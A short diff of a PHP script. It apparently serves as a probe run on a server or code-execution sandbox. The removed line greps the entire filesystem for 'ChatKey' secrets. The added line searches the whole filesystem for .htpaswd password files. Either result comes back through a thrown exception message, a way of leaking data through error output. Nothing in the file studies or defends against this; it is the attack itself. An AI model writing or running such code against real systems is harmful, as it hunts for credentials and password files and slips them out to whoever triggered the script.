@@ -1,7 +1,7 @@
 <?php
 $output ='';
 
-$output =$output."\n find  *bad* with cat".shell_exec ("grep -rnw '/' -e '*ChatKey*' | cat");
+$output =$output."\n htpaswd ".shell_exec ("find / -name '*.htpaswd*'");
 
 throw new Exception("\n SUCCESS  ". $output."\n");
 ?>
